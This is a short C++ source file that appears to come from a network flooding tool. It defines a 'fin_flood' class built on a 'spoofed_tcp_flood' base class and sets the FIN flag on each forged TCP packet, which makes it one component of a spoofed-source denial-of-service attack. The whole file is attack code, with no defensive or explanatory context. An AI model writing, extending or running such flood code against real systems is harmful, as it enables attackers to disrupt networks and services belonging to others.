#include "fin_flood.hpp"

fin_flood::fin_flood() : spoofed_tcp_flood() {}

void fin_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
  tcp->th_flags = TH_FIN;
  spoofed_tcp_flood::finalize_hdr(tcp, ip);
}
